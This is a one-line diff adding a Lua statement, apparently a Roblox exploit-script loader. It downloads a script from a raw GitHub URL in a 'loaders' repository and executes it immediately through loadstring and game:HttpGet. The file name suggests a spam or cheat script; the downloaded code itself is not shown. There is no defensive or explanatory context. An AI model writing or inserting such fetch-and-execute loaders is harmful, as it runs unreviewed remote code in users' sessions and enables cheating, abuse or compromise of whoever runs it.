@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/beta-buddytime-spam5-p9vpwdafkvjw06.lua"))()
